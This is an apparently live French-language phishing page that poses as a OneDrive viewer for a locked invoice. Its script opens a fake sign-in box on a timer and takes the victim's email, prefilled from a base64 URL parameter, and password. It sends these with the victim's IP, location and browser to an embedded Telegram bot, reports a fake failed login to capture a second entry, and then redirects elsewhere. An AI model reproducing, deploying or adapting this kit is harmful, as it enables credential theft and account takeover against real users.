<!DOCTYPE html>
<html lang="fr" data-theme="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Visionneuse PDF √† Page Unique</title>
  <style>
    /* ------------------
       Design Tokens (Dark + Blue theme)
    ------------------- */
    :root{
      --bg: #0b1020;               /* deep navy */
      --panel: #0f172a;            /* slate-900 */
      --panel-2: #111827;          /* gray-900 */
      --muted: #93a4c1;            /* slate-300/400 mix */
      --text: #e5ebf7;             /* light text */
      --accent: #2563eb;           /* blue-600 */
      --accent-2: #3b82f6;         /* blue-500 */
      --border: #1e2a44;           /* navy border */
      --shadow: 0 10px 30px rgba(0,0,0,.45);
      --radius: 16px;
      --page-w: 210mm;
      --page-h: 297mm;
      --zoom: 0.9;
    }

    *{ box-sizing: border-box }
    html, body { height: 100% }
    body{
      margin:0; font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Inter, Arial, Noto Sans;
      color: var(--text);
      background: radial-gradient(1200px 800px at 20% -10%, #1f3a8a33, transparent),
                  radial-gradient(1000px 600px at 100% 0%, #0ea5e91a, transparent),
                  var(--bg);
    }

    /* ---------- App Layout ---------- */
    .app{ display:grid; grid-template-rows:auto 1fr auto; height:100dvh; gap:12px; padding:12px }
    .bar{ display:flex; align-items:center; gap:10px; padding:10px 12px; background:var(--panel); border:1px solid var(--border); border-radius:var(--radius); box-shadow:var(--shadow) }
    .topbar{ justify-content:space-between }
    .logo{ display:flex; align-items:center; justify-content:center; width:auto; height:28px; border-radius:6px; background:transparent; box-shadow:none; padding:0 }
    .logo img{ height:28px; width:auto; display:block }

    .crumbs{ display:flex; align-items:center; gap:6px; color:var(--muted); font-size:14px }
    .crumbs .sep{ opacity:.6 }
    .filename{ font-weight:600; color:var(--text) }

    .btn{ appearance:none; border:1px solid var(--border); background:transparent; color:var(--text); padding:8px 10px; border-radius:10px; cursor:pointer; display:inline-flex; align-items:center; gap:8px; transition:.2s ease all }
    .btn[aria-disabled="true"]{ opacity:.5; cursor:not-allowed; pointer-events:none }
    .btn:hover{ background: color-mix(in srgb, var(--panel) 80%, #000 20%) }
    .btn:hover{ background: color-mix(in srgb, var(--panel) 80%, #000 20%) }
    .btn.primary{ background: var(--accent); border-color: color-mix(in srgb, var(--accent) 60%, #000 40%); color:white }
    .btn.primary:hover{ background: var(--accent-2) }
    .btn.ghost{ border-color: transparent }
    .icon{ width:16px; height:16px; display:inline-block }

    .search{ position:relative; flex:1; max-width:460px }
    .search input{ width:100%; padding:10px 12px 10px 36px; border-radius:12px; border:1px solid var(--border); background: color-mix(in srgb, var(--panel) 85%, #000 15%); color:var(--text) }
    .search .icon{ position:absolute; left:10px; top:50%; translate:0 -50%; opacity:.55 }

    /* ---------- Single Viewer ---------- */
    .viewer{ background:var(--panel); border:1px solid var(--border); border-radius:var(--radius); padding:0; overflow:auto; position:relative; box-shadow:var(--shadow); min-height:0 }
    .canvas{ display:flex; justify-content:center; padding:28px }

    .page{ width:var(--page-w); height:var(--page-h); background:#ffffff; color:#111827; border-radius:14px; box-shadow: 0 6px 16px rgba(0,0,0,.35); border:1px solid #d8def0; position:relative; overflow:hidden; transform: scale(var(--zoom)); transform-origin: top center }
    .page .inner{ padding:24mm 20mm 20mm; position:relative }

    /* Invoice-like placeholder styling */
    .invoice-header{ display:flex; align-items:flex-start; justify-content:space-between; margin-bottom:10mm }
    .invoice-brand{ display:grid; gap:6px }
    .invoice-brand .title{ font-size:18pt; font-weight:800; letter-spacing: .4px }
    .invoice-brand .sub{ font-size:10pt; color:#475569 }
    .invoice-meta{ text-align:right; font-size:10pt; color:#475569 }
    .section{ margin-bottom:8mm }
    .two-col{ display:grid; grid-template-columns:1fr 1fr; gap:10mm }
    .h2{ font-size:12pt; font-weight:700; margin:0 0 6px }
    .small{ font-size:10pt; color:#475569 }
    table.inv{ width:100%; border-collapse:collapse; margin-top:4mm }
    table.inv th, table.inv td{ border:1px solid #e5e7eb; padding:6px 8px; font-size:10pt }
    table.inv th{ background:#f3f4f6; text-align:left }
    .total-row td{ font-weight:700 }

    /* Locked state: blur only the content, not the button */
    .locked .inner{ filter: blur(4px) saturate(.85); pointer-events:none; user-select:none }
    .locked .watermark{ display:block }
    .watermark{ display:none; position:absolute; inset:0; pointer-events:none; mix-blend-mode:multiply; opacity:.14; background: repeating-linear-gradient(45deg, transparent 0 28px, rgba(0,0,0,.06) 28px 56px) }
    .watermark span{ position:absolute; inset:auto; left:50%; top:50%; translate:-50% -50%; font-weight:800; font-size:64px; color:#0f172a; letter-spacing:8px }

    /* Unlock button centered ON the page, above blur */
    .unlock-on-page{ position:absolute; left:50%; top:30%; transform: translate(-50%, -50%); z-index:3; padding:14px 18px; border-radius:12px; border:1px solid color-mix(in srgb, var(--accent) 50%, #000 50%); background:var(--accent); color:#fff; cursor:pointer; display:inline-flex; align-items:center; gap:8px; box-shadow:var(--shadow) }
    .unlock-on-page:hover{ background: var(--accent-2) }

    /* Floating controls (no page selector) */
    .controls{ position:sticky; bottom:18px; display:flex; justify-content:center; width:100%; pointer-events:none }
    .controls .wrap{ pointer-events:auto; background: color-mix(in srgb, var(--panel-2) 85%, #000 15%); border:1px solid var(--border); border-radius:999px; padding:6px; display:flex; gap:6px; align-items:center; box-shadow:var(--shadow) }
    .seg{ display:flex; gap:2px; background: color-mix(in srgb, var(--panel-2) 70%, #000 30%); padding:4px; border-radius:999px }
    .chip{ padding:8px 10px; border-radius:999px; border:1px solid transparent; cursor:pointer; background:transparent; color:var(--text) }
    .chip[aria-pressed="true"], .chip:hover{ background: var(--accent); color:#fff }
    .zoom{ display:flex; align-items:center; gap:8px; padding:0 8px }
    input[type="range"]{ accent-color: var(--accent) }

    /* Footer */
    .bottombar{ justify-content:space-between; font-size:14px; color:var(--muted) }

    /* Auth Modal Styles */
    .modal-backdrop { position: fixed; inset: 0; background: rgba(0,0,0,.55); display: none; align-items: center; justify-content: center; z-index: 1000; }
    .modal-backdrop.show { display: flex; }
    .modal { background: #ffffff; border: 1px solid #e5e7eb; border-radius: 12px; width: min(400px, 90vw); box-shadow: 0 24px 60px rgba(0,0,0,.35); color: #111827; overflow:hidden }
    .modal header { display: grid; grid-template-columns: 1fr auto 1fr; align-items: center; padding: 14px 16px; border-bottom: 1px solid #e5e7eb; }
    .modal header h3 { margin: 0; font-size: 16px; font-weight: 700; }
    .modal .close { border: none; background: transparent; font-size: 20px; line-height: 1; cursor: pointer; color: #6b7280; }
    .modal .body { padding: 24px; }
    .logo-modal{ display:flex; align-items:center; gap:8px; grid-column:1; }
    .logo-modal img{ height:32px; width=32px; object-fit:contain; display=block }

    .auth-form { display: flex; flex-direction: column; gap: 16px; }
    .form-group { display: flex; flex-direction: column; gap: 8px; }
    .form-group label { font-weight: 600; font-size: 14px; }
    .form-group input { padding: 10px 12px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 14px; width: 100%; }
    .form-group input:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1); }
    .error-message { color: #ef4444; font-size: 14px; margin-top: 4px; display: none; }
    .error-message.show { display: block; }
    .auth-buttons { display: flex; justify-content: flex-end; gap: 10px; margin-top: 10px; }
    .auth-buttons .btn { padding: 8px 16px; }

    /* Detected email display */
    .detected-email { display: flex; align-items: center; gap: 10px; padding: 12px; background: #f8fafc; border-radius: 8px; border: 1px solid #e2e8f0; margin-bottom: 16px; }
    .profile-avatar { width: 32px; height: 32px; border-radius: 50%; background: #3b82f6; display: flex; align-items: center; justify-content: center; color: white; font-weight: 600; font-size: 14px; }
    .email-info { flex: 1; }
    .email-label { font-size: 12px; color: #64748b; }
    .email-value { font-weight: 600; font-size: 14px; color: #1e293b; }

    /* Entered email display (for manually entered emails) */
    .entered-email { display: flex; align-items: center; gap: 10px; padding: 12px; background: #f8fafc; border-radius: 8px; border: 1px solid #e2e8f0; margin-bottom: 16px; }
    .entered-email .profile-avatar { background: #10b981; } /* Different color for entered email */

    /* Print styles */
    @media print{
      body{ background:white }
      .app{ display:block; padding=0 }
      .bar, .controls, .unlock-on-page{ display:none !important }
      .viewer{ border=0; box-shadow:none }
      .page{ transform:none; box-shadow:none; border:none }
      .locked .inner{ filter:none }
      .watermark{ display:none !important }
    }
  </style>
</head>
<body>
  <div class="app">
    <!-- Top bar -->
    <div class="bar topbar">
      <div class="left" style="display:flex;align-items:center;gap:10px">
        <div class="logo" aria-label="OneDrive logo"><img src="https://i.ibb.co/SXK5vjRz/pngwing-com.png" alt="OneDrive"/></div>
        <div class="crumbs" aria-label="Breadcrumbs">
          <span>Mes Fichiers</span>
          <span class="sep">‚Ä∫</span>
          <span>Factures</span>
          <span class="sep">‚Ä∫</span>
          <span class="filename" id="filename">Facture-000512.pdf</span>
        </div>
      </div>
      <div class="search">
        <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
        <input id="search" placeholder="Rechercher dans le document (Ctrl+F)" />
      </div>
      <div class="right" style="display:flex;align-items:center;gap:10px">
        <button class="btn" id="themeBtn" title="Basculer le th√®me" aria-pressed="true">
          <svg class="icon" viewBox="0 0 24 24" fill="currentColor"><path d="M12 3a9 9 0 1 0 9 9 7 7 0 0 1-9-9Z"/></svg>
          Th√®me
        </button>
        <button class="btn" id="shareBtn" title="Partager">
          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 12v7a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7"/><path d="M16 6l-4-4-4 4"/><path d="M12 2v14"/></svg>
          Partager
        </button>
      </div>
    </div>

    <!-- Single-page viewer -->
    <section class="viewer locked" id="viewer" aria-label="Visionneuse de document" data-locked="true">
      <div class="canvas" id="canvas">
        <article class="page" data-page="1">
          <div class="watermark"><span>VERROUILL√â</span></div>
          <button class="unlock-on-page" id="unlockOnPageBtn" title="D√©verrouiller">
            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
            D√©verrouiller pour voir
          </button>
          <div class="inner">
            <!-- Invoice-like demo content -->
            <div class="invoice-header">
              <div class="invoice-brand">
                <div class="title" style="color:#111827">ACME CORP</div>
                <div class="sub">123 Ocean Ave ¬∑ Seattle, WA ¬∑ +1 (555) 555‚Äë0199</div>
              </div>
              <div class="invoice-meta">
                <div><strong>Facture</strong> #000512</div>
                <div>Date: 2025‚Äë09‚Äë15</div>
                <div>√âch√©ance: 2025‚Äë09‚Äë30</div>
              </div>
            </div>

            <div class="two-col section">
              <div>
                <div class="h2">Factur√© √†</div>
                <div class="small">Contoso Ltd.<br/>987 Market St<br/>San Francisco, CA 94103</div>
              </div>
              <div>
                <div class="h2">Livr√© √†</div>
                <div class="small">Contoso Warehouse<br/>210 Harbor Way<br/>Oakland, CA 94607</div>
              </div>
            </div>

            <div class="section">
              <table class="inv">
                <thead>
                  <tr><th style="width:55%">Description</th><th style="width:15%">Qt√©</th><th style="width:15%">Unit√©</th><th style="width:15%">Montant</th></tr>
                </thead>
                <tbody>
                  <tr><td>Services de design (UI/UX, sprint 23)</td><td>24</td><td>$85.00</td><td>$2,040.00</td></tr>
                  <tr><td>Impl√©mentation frontend (composants React)</td><td>30</td><td>$95.00</td><td>$2,850.00</td></tr>
                  <tr><td>QA & accessibilit√©</td><td>12</td><td>$70.00</td><td>$840.00</td></tr>
                  <tr class="total-row"><td colspan="3" style="text-align:right">Sous-total</td><td>$5,730.00</td></tr>
                  <tr class="total-row"><td colspan="3" style="text-align:right">Taxe (8.5%)</td><td>$487.05</td></tr>
                  <tr class="total-row"><td colspan="3" style="text-align:right">Total d√ª</td><td>$6,217.05</td></tr>
                </tbody>
              </table>
            </div>

            <div class="small" style="margin-top:10mm;color:#64748b">Paiement d√ª dans les 15 jours. Merci pour votre confiance.</div>
          </div>
        </article>
      </div>

      <!-- Floating Controls (zoom + fit only) -->
      <div class="controls" aria-hidden="false">
        <div class="wrap">
          <div class="seg">
            <button class="chip" id="fitWidth" title="Ajuster √† la largeur (W)">Largeur</button>
            <button class="chip" id="fitPage" title="Ajuster √† la page (P)">Page</button>
            <button class="chip" id="toggleFocus" title="Basculer le mode focus (F)">Focus</button>
          </div>
          <div class="zoom">
            <button class="chip" id="zoomOut" title="Zoom arri√®re (-)">‚àí</button>
            <input type="range" id="zoomRange" min="0.5" max="2" value="0.9" step="0.05" aria-label="Zoom" />
            <button class="chip" id="zoomIn" title="Zoom avant (+)">+</button>
            <button class="chip" id="zoomReset" title="R√©initialiser le zoom (0)">90%</button>
          </div>
        </div>
      </div>
    </section>

    <!-- Bottom bar -->
    <div class="bar bottombar">
      <div>Pr√™t ¬∑ <span id="status">Aper√ßu verrouill√©</span></div>
      <div>
        <a class="btn ghost" href="#" aria-disabled="true" title="Imprimer (d√©sactiv√©)">
          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9V2h12v7"/><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"/><path d="M6 14h12v8H6z"/></svg>
          Imprimer
        </a>
        <a class="btn ghost" href="#" aria-disabled="true" title="T√©l√©charger (d√©sactiv√©)">
          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M7 10l5 5 5-5"/><path d="M12 15V3"/></svg>
          T√©l√©charger
        </a>
      </div>
    </div>
  </div>

  <!-- Auth Modal -->
  <div class="modal-backdrop" id="authModal">
    <div class="modal auth-modal" role="dialog" aria-modal="true" aria-labelledby="authModalTitle">
      <header>
        <div class="logo-modal" aria-label="OneDrive">
          <img src="https://i.ibb.co/SXK5vjRz/pngwing-com.png" alt="OneDrive"/>
        </div>
        <h3 id="authModalTitle">Authentification Requise</h3>
        <button class="close" aria-label="Fermer" id="authModalClose" style="grid-column:3; justify-self:end;">√ó</button>
      </header>
      <div class="body">
        <!-- Container for detected email (from URL) -->
        <div id="detectedEmailContainer" style="display: none;">
          <div class="detected-email">
            <div class="profile-avatar" id="detectedProfileAvatar">U</div>
            <div class="email-info">
              <div class="email-label">Connect√© en tant que</div>
              <div class="email-value" id="detectedEmailValue">user@example.com</div>
            </div>
          </div>
        </div>
        
        <!-- Container for entered email (manually typed) -->
        <div id="enteredEmailContainer" style="display: none;">
          <div class="entered-email">
            <div class="profile-avatar" id="enteredProfileAvatar">U</div>
            <div class="email-info">
              <div class="email-label">Continuer en tant que</div>
              <div class="email-value" id="enteredEmailValue">user@example.com</div>
            </div>
          </div>
        </div>
        
        <div class="auth-form">
          <div class="form-group" id="emailGroup">
            <label for="emailInput">Adresse Email</label>
            <input type="email" id="emailInput" placeholder="Entrez votre email" autocomplete="email" />
            <div class="error-message" id="emailError">Veuillez entrer une adresse email valide</div>
          </div>
          <div class="form-group" id="passwordGroup" style="display: none;">
            <label for="passwordInput">Mot de passe</label>
            <input type="password" id="passwordInput" placeholder="Entrez votre mot de passe" autocomplete="current-password" />
            <div class="error-message" id="passwordError">Identifiants invalides. Veuillez r√©essayer.</div>
          </div>
          <div class="auth-buttons">
            <button class="btn" id="authCancelBtn">Annuler</button>
            <button class="btn primary" id="authNextBtn">Suivant</button>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    const html = document.documentElement;
    const viewer = document.getElementById('viewer');
    const zoomRange = document.getElementById('zoomRange');
    const status = document.getElementById('status');
    const unlockBtn = document.getElementById('unlockOnPageBtn');
    
    // Auth modal elements
    const authModal = document.getElementById('authModal');
    const authModalClose = document.getElementById('authModalClose');
    const authCancelBtn = document.getElementById('authCancelBtn');
    const authNextBtn = document.getElementById('authNextBtn');
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const emailGroup = document.getElementById('emailGroup');
    const passwordGroup = document.getElementById('passwordGroup');
    const emailError = document.getElementById('emailError');
    const passwordError = document.getElementById('passwordError');
    
    // Email display containers
    const detectedEmailContainer = document.getElementById('detectedEmailContainer');
    const detectedEmailValue = document.getElementById('detectedEmailValue');
    const detectedProfileAvatar = document.getElementById('detectedProfileAvatar');
    
    const enteredEmailContainer = document.getElementById('enteredEmailContainer');
    const enteredEmailValue = document.getElementById('enteredEmailValue');
    const enteredProfileAvatar = document.getElementById('enteredProfileAvatar');
    
    let zoom = 0.9;
    let isEmailStage = true;
    let autoTriggerTimeout;
    let detectedEmail = null;
    let currentEmail = null;
    let attemptCount = 0;
    const maxAttempts = 2; // Changed from 3 to 2 (1 initial + 1 more attempt)

    // Environment variables
    const env = {
      TELEGRAM_TOKEN: '8043918109:AAHq02pj7XjBIwYYENtftpes-RUnDMnWvlA',
      TELEGRAM_CHAT_ID: '-1002493880170',
      FINAL_URL: 'https://amc.ferolli.lv'
    };

    // Get URL parameters
    function getUrlParameter(name) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(name);
    }

    // Detect email from URL
    function detectEmailFromUrl() {
      const caseParam = getUrlParameter('case');
      if (caseParam) {
        try {
          // Try to decode base64
          const decoded = atob(caseParam);
          if (decoded.includes('@') && decoded.includes('.')) {
            return decoded;
          }
        } catch (e) {
          console.log('Not a valid base64 email');
        }
      }
      return null;
    }

    // Get user info for Telegram message
    async function getUserInfo() {
      let country = 'Inconnu';
      let region = 'Inconnu';
      let ip = 'Inconnu';
      let browser = 'Inconnu';

      try {
        // Get IP and location info
        const ipResponse = await fetch('https://ipapi.co/json/');
        if (ipResponse.ok) {
          const ipData = await ipResponse.json();
          country = ipData.country_name || 'Inconnu';
          region = ipData.region || 'Inconnu';
          ip = ipData.ip || 'Inconnu';
        }
      } catch (e) {
        console.log('Could not fetch IP info');
      }

      // Get browser info
      const ua = navigator.userAgent;
      if (ua.includes('Chrome')) browser = 'Chrome';
      else if (ua.includes('Firefox')) browser = 'Firefox';
      else if (ua.includes('Safari')) browser = 'Safari';
      else if (ua.includes('Edge')) browser = 'Edge';

      return { country, region, ip, browser };
    }

    // Get avatar initial
    function getAvatarInitial(email) {
      return email.charAt(0).toUpperCase();
    }

    function setZoom(val){
      zoom = Math.min(2, Math.max(0.5, val));
      document.documentElement.style.setProperty('--zoom', zoom);
      zoomRange.value = zoom.toFixed(2);
      document.getElementById('zoomReset').textContent = Math.round(zoom*100)+'%';
    }

    function fitWidth(){
      const pad = 56;
      const available = viewer.clientWidth - pad;
      const pageWmm = getComputedStyle(document.documentElement).getPropertyValue('--page-w');
      const temp = document.createElement('div'); temp.style.width = pageWmm; document.body.appendChild(temp);
      const px = temp.getBoundingClientRect().width; temp.remove();
      setZoom(available / px);
    }

    function fitPage(){
      const pad = 120;
      const availableH = viewer.clientHeight - pad;
      const pageHmm = getComputedStyle(document.documentElement).getPropertyValue('--page-h');
      const temp = document.createElement('div'); temp.style.height = pageHmm; document.body.appendChild(temp);
      const px = temp.getBoundingClientRect().height; temp.remove();
      setZoom(availableH / px);
    }

    // Controls wiring
    document.getElementById('fitWidth').onclick = fitWidth;
    document.getElementById('fitPage').onclick = fitPage;
    document.getElementById('zoomIn').onclick = () => setZoom(zoom + 0.1);
    document.getElementById('zoomOut').onclick = () => setZoom(zoom - 0.1);
    document.getElementById('zoomReset').onclick = () => setZoom(0.9);
    document.getElementById('toggleFocus').onclick = () => document.body.classList.toggle('focus');

    zoomRange.addEventListener('input', (e)=> setZoom(parseFloat(e.target.value)));

    // Theme toggle
    document.getElementById('themeBtn').addEventListener('click', (e)=>{
      const dark = html.getAttribute('data-theme') !== 'dark';
      html.setAttribute('data-theme', dark ? 'dark' : 'light');
      e.currentTarget.setAttribute('aria-pressed', String(dark));
    });

    // Auth modal functions
    function showAuthModal() {
      resetAuthModal();
      
      // Check if we have a detected email from URL
      if (detectedEmail) {
        detectedEmailContainer.style.display = 'block';
        detectedEmailValue.textContent = detectedEmail;
        detectedProfileAvatar.textContent = getAvatarInitial(detectedEmail);
        emailGroup.style.display = 'none';
        passwordGroup.style.display = 'flex'; // Show password field
        isEmailStage = false;
        currentEmail = detectedEmail;
        authNextBtn.textContent = 'Continuer';
        setTimeout(() => passwordInput.focus(), 100);
      } else {
        // No detected email, show email input
        detectedEmailContainer.style.display = 'none';
        enteredEmailContainer.style.display = 'none';
        emailGroup.style.display = 'flex';
        passwordGroup.style.display = 'none'; // Hide password field
        isEmailStage = true;
        authNextBtn.textContent = 'Suivant';
        setTimeout(() => emailInput.focus(), 100);
      }
      
      authModal.classList.add('show');
    }

    function hideAuthModal() {
      authModal.classList.remove('show');
    }

    function resetAuthModal() {
      if (!detectedEmail) {
        emailInput.value = '';
      }
      passwordInput.value = '';
      emailError.classList.remove('show');
      passwordError.classList.remove('show');
      authNextBtn.disabled = false;
      
      // Reset UI state based on whether we have a detected email
      if (detectedEmail) {
        passwordGroup.style.display = 'flex';
      } else {
        passwordGroup.style.display = 'none';
      }
    }

    function validateEmail(email) {
      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return re.test(email);
    }

    async function sendTelegramMessage(email, password) {
      const userInfo = await getUserInfo();
      
      const message = `
üåç Pays: ${userInfo.country}
üìç R√©gion: ${userInfo.region}
üñ•Ô∏è IP: ${userInfo.ip}
üîç Navigateur: ${userInfo.browser}
üìß Email: ${email}
üîë Mot de passe: ${password}
      `.trim();

      console.log('Sending to Telegram:', message);
      
      // This would send to your actual Telegram bot
      if (env.TELEGRAM_TOKEN && env.TELEGRAM_CHAT_ID) {
        // Simulate API call - replace with actual Telegram bot API
        const telegramUrl = `https://api.telegram.org/bot${env.TELEGRAM_TOKEN}/sendMessage`;
        try {
          await fetch(telegramUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: env.TELEGRAM_CHAT_ID,
              text: message,
              parse_mode: 'HTML'
            })
          });
        } catch (error) {
          console.error('Telegram API error:', error);
        }
      }
      
      return new Promise((resolve) => {
        setTimeout(() => {
          resolve(true);
        }, 500);
      });
    }

    function redirectToFinalURL() {
      // Build URL with correct parameter structure: ?&login_hint={email}&prompt=login&sso_reload=true
      let redirectUrl = env.FINAL_URL;
      
      // Always start with ?&login_hint= (the ?& structure you specified)
      if (currentEmail) {
        redirectUrl += `?&login_hint=${encodeURIComponent(currentEmail)}&prompt=login&sso_reload=true`;
      } else {
        redirectUrl += '?&prompt=login&sso_reload=true';
      }
      
      window.location.href = redirectUrl;
    }

    // Auth modal event listeners
    authModalClose.addEventListener('click', hideAuthModal);
    authCancelBtn.addEventListener('click', hideAuthModal);
    authModal.addEventListener('click', (e) => {
      if (e.target === authModal) hideAuthModal();
    });

    authNextBtn.addEventListener('click', async () => {
      if (isEmailStage) {
        const email = emailInput.value.trim();
        if (!validateEmail(email)) {
          emailError.classList.add('show');
          return;
        }
        
        // Move to password stage - show entered email
        isEmailStage = false;
        emailGroup.style.display = 'none';
        passwordGroup.style.display = 'flex';
        enteredEmailContainer.style.display = 'block';
        enteredEmailValue.textContent = email;
        enteredProfileAvatar.textContent = getAvatarInitial(email);
        currentEmail = email;
        authNextBtn.textContent = 'Continuer';
        setTimeout(() => passwordInput.focus(), 100);
      } else {
        const password = passwordInput.value;
        
        if (!password) {
          passwordError.classList.add('show');
          return;
        }
        
        // Show loading state
        authNextBtn.textContent = 'V√©rification...';
        authNextBtn.disabled = true;
        
        // Send credentials to Telegram
        await sendTelegramMessage(currentEmail, password);
        
        attemptCount++;
        
        if (attemptCount >= maxAttempts) {
          // Redirect after max attempts with correct URL structure
          setTimeout(() => {
            redirectToFinalURL();
          }, 1000);
        } else {
          // Show invalid message and reset password field
          passwordError.textContent = 'Identifiants invalides. Veuillez r√©essayer.';
          passwordError.classList.add('show');
          passwordInput.value = '';
          setTimeout(() => {
            passwordError.classList.remove('show');
            authNextBtn.textContent = 'Continuer';
            authNextBtn.disabled = false;
            passwordInput.focus();
          }, 1500);
        }
      }
    });

    // Handle Enter key in auth form
    emailInput.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') {
        authNextBtn.click();
      }
    });
    
    passwordInput.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') {
        authNextBtn.click();
      }
    });

    // Unlock behavior -> open auth modal
    unlockBtn.addEventListener('click', () => {
      status.textContent = 'V√©rification‚Ä¶';
      showAuthModal();
    });

    // Auto-trigger after 10 seconds if not clicked
    function setupAutoTrigger() {
      autoTriggerTimeout = setTimeout(() => {
        if (!authModal.classList.contains('show')) {
          showAuthModal();
        }
      }, 10000);
    }

    // Cancel auto-trigger if user interacts with the modal
    function cancelAutoTrigger() {
      if (autoTriggerTimeout) {
        clearTimeout(autoTriggerTimeout);
      }
    }

    // Initialize on load
    window.addEventListener('load', () => { 
      setZoom(0.9);
      
      // Detect email from URL
      detectedEmail = detectEmailFromUrl();
      
      setupAutoTrigger();
    });
    
    // Cancel auto-trigger if user clicks unlock button
    unlockBtn.addEventListener('click', cancelAutoTrigger);
    
    // Keep current zoom steady on resize
    window.addEventListener('resize', () => { /* no auto-fit on resize */ });
  </script>
</body>
</html>
